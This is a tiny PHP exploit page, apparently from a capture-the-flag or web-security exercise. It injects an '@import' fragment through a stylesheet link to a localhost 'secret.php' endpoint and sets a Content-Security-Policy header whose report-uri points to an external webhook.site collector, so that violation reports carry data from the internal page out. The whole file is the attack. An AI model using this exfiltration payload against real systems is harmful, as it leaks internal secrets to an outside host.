<?php
echo '<link rel="stylesheet" href="http://127.0.0.1/secret.php?whatUwant=@import \'">';
header("Content-Security-Policy: style-src http://127.0.0.1/secret.php; report-uri https://webhook.site/04b72cbe-5308-4e5c-9930-11d0629c7ee9;");
?>


